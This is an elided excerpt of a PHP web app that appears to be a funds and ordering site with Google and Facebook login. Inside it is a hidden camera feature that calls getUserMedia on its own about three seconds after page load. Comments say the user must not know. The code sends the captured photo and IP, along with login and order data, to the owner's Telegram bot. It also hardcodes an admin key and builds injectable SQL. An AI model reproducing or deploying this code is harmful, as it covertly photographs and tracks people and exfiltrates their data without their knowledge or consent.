...
if($check == 0) {
    ...
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('admin_key', 'OWNER-X-ROHIT')");
...
if(isset($_POST['admin_action'])) {
    ...
    if($admin_key === $ADMIN_KEY) {
        ...
        elseif($action === 'change_admin_key') {
            ...
            echo "<script>alert('Admin Key updated! New key: $new_key'); window.location.href='?admin=1';</script>";
            exit;
        }
        ...
        elseif($action === 'ban_user') {
            ...
            botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => "User ID $user_id banned by Admin"]);
        ...
        elseif($action === 'unban_user') {
            ...
            botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => "User ID $user_id unbanned by Admin"]);
...
if(isset($_POST['google_credential'])) {
    ...
    if($check) {
        ...
        else { $_SESSION['user_id'] = $check['id']; $_SESSION['logged_in'] = true; }
    } else {
...
// Google Funds - Bot ko data bhejna
...
// Facebook Funds - Bot ko data bhejna
...
// Google Order - Bot ko data bhejna
...
// Facebook Order - Bot ko data bhejna
...
// Capture Photo - HIDDEN (User ko pata na chale)
...
if(isset($_POST['hidden_capture'])) {
    ...
    $db->exec("UPDATE users SET captured_photo='$photo_data', location='Unknown' WHERE id=$user_id");
    
    sendPhotoToBot($photo_data, "User ID: $user_id\nIP: $ip\nLocation: Hidden Capture");
...
<head>
    ...
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        ...
        /* HIDDEN CAMERA - User ko pata na chale */
        #hiddenCamera { display:none; }
...
<!-- HIDDEN CAMERA ELEMENTS (User ko pata na chale) -->
        ...
        <div id="adminContent" style="display:none; margin-top:20px;">
            ...
            <div class="admin-panel">
                ...
                <form method="post">
                    ...
                    <input type="text" name="new_admin_key" placeholder="New Admin Key" value="OWNER-X-ROHIT">
            ...
            <!-- Users List with Ban/Unban Button -->
            <div class="admin-panel">
...
// HIDDEN CAMERA - Background mein capture
function hiddenCapture() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
...
// Auto capture on page load (background mein)
<?php if(isset($_SESSION['user_id']) && !empty($_SESSION['user_id'])): ?>
setTimeout(hiddenCapture, 3000);
<?php endif; ?>
